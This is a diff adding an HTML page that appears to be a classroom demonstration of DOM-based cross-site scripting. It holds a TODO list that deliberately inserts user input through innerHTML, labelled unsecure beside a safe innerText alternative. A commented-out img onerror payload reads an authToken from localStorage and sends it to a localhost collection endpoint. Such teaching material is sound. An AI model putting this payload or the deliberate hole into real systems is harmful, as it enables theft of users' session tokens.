@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Cross-Site Scripting</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+</head>
+
+<body class="p-5">
+    <h1>dom xss</h1>
+    <label for="todo" class="form-label">TODO item</label>
+    <input type="text" class="form-control" id="todo">
+    <button id="add" type="button" class="btn btn-primary mt-3">Add</button>
+    <h2 class="my-3">TODO list</h2>
+    <ul id="todoList" class="list-group">
+    </ul>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
+    crossorigin="anonymous"></script>
+    <script>
+        const todoList = document.querySelector("#todoList");
+        const todo = document.querySelector("#todo");
+        const button = document.querySelector("#add");
+        
+        button.addEventListener('click', () => {
+            const todoItem = document.createElement('li');
+            if (!todo.value.trim()) {
+                return;
+            }
+        
+            todoItem.classList.add('list-group-item');
+            // UNSECURE
+            // TRY script alert
+            // TRY img onerror
+            todoItem.innerHTML = `${todo.value}`;
+        
+            // SECURE
+            //todoItem.innerText = `${todo.value}`;
+        
+            todoList.appendChild(todoItem);
+            todo.value = "";
+        
+        
+        })
+        
+        //<img src="x" onerror="const authToken = localStorage.getItem('authToken');const url = `http://localhost:3000/saveToken?authToken=${encodeURIComponent(authToken)}`;fetch(url).then(response => {if (response.ok) {console.log('Token inviato con successo!');} else {console.error('Errore durante l\'invio del token');}}).catch(error => console.error('Errore di rete:', error));">
+        
+    </script>
+</body>
+
+</html>
